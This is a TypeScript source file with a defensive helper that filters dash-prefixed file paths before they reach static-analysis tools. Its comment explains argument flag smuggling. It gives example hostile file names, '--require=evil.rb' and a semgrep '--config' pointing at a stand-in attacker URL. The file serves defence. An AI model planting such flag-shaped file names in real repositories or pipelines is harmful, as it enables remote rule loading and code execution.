// Argv flag-smuggling guard for the static-analysis adapters.
//
// The file paths we hand each analyzer come from the changed-file list,
// which can hold anything a branch brought in. A path whose name begins
// with "-" (a change can add a
// file literally named "--require=evil.rb" for rubocop, or
// "--config=https://attacker/rules.yaml" for semgrep) would be parsed by
// the tool as a FLAG, not a path. execFile already prevents shell
// injection (no shell is involved), but it does not stop an attacker-
// controlled argument from being interpreted as an option. Depending on
// the tool that ranges from disabling checks to remote rule loading to
// arbitrary code execution.
//
// Defense in depth: callers drop "-"-prefixed paths via safeFileArgs AND
// pass a "--" end-of-options marker before the file list, so even a tool
// that does not honor "--" never sees a flag-shaped path.
export function safeFileArgs(paths: string[]): string[] {
  return paths.filter((p) => !p.startsWith("-"));
}
